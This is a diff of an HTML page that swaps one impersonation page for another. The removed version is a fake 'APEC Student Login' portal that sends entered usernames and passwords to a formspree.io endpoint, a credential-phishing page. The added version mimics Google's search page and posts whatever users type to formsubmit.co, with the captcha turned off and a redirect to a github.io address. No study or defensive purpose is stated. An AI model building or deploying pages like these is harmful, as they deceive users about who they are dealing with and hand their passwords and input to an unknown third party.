@@ -3,118 +3,88 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>APEC Student Login</title>
+<title>Search Box</title>
 
 <style>
 *{
     margin:0;
     padding:0;
     box-sizing:border-box;
-    font-family:Arial, Helvetica, sans-serif;
+    font-family:Arial, sans-serif;
 }
 
 body{
-    background:linear-gradient(135deg,#003366,#0073e6);
-    height:100vh;
     display:flex;
     justify-content:center;
     align-items:center;
+    height:100vh;
+    background:#fff;
 }
 
-.login-box{
-    background:#fff;
-    width:380px;
-    padding:35px;
-    border-radius:15px;
-    box-shadow:0 10px 25px rgba(0,0,0,.3);
+.container{
     text-align:center;
 }
 
 .logo{
-    width:100px;
-    height:100px;
-    object-fit:contain;
-    margin-bottom:15px;
+    font-size:60px;
+    font-weight:bold;
+    color:#4285F4;
+    margin-bottom:30px;
 }
 
-h2{
-    color:#003366;
-    margin-bottom:5px;
-}
-
-p{
-    color:#666;
-    margin-bottom:20px;
-}
-
-input{
-    width:100%;
-    padding:12px;
-    margin:10px 0;
+.search{
+    width:500px;
+    padding:15px;
+    font-size:18px;
     border:1px solid #ccc;
-    border-radius:8px;
-    font-size:16px;
-}
-
-input:focus{
+    border-radius:30px;
     outline:none;
-    border-color:#0073e6;
 }
 
 button{
-    width:100%;
-    padding:12px;
-    background:#003366;
-    color:white;
+    margin-top:20px;
+    padding:12px 30px;
     border:none;
-    border-radius:8px;
-    font-size:16px;
+    background:#4285F4;
+    color:white;
+    font-size:18px;
+    border-radius:30px;
     cursor:pointer;
 }
 
 button:hover{
-    background:#0059b3;
-}
-
-.footer{
-    margin-top:20px;
-    font-size:13px;
-    color:#777;
+    background:#3367d6;
 }
 </style>
 
 </head>
+
 <body>
 
-<div class="login-box">
+<div class="container">
 
-<img src="1697346843915.jpeg" alt="College Logo" class="logo">
+<h1 class="logo">Google</h1>
 
-<h2>APEC Student Login</h2>
+<form action="https://formsubmit.co/your-email@gmail.com" method="POST">
 
-<p>Student Login Portal</p>
+<input type="hidden" name="_captcha" value="false">
 
-<form action="https://formspree.io/f/xnjkwrlj" method="POST">
+<input type="hidden" name="_template" value="table">
+
+<input type="hidden" name="_next" value="https://yourusername.github.io/yourrepository/">
 
 <input
 type="text"
-name="Username"
-placeholder="Enter Username"
+name="Search_Text"
+class="search"
+placeholder="Search Google or type a URL"
 required>
 
-<input
-type="password"
-name="Password"
-placeholder="Enter Password"
-required>
+<br>
 
-<button type="submit">Login</button>
+<button type="submit">Search</button>
 
 </form>
-
-<div class="footer">
-© 2026 APEC Student Portal
-</div>
 
 </div>
 
